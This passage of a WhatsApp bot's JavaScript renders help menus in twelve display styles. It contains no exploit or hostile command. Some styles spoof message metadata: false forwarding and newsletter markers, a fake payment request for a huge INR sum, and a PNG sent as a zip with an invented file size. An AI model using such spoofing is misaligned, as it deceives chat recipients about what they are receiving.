          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'soundmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${soundmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break

case 'listvnn': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${listvnn(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break

case 'listmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${listmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
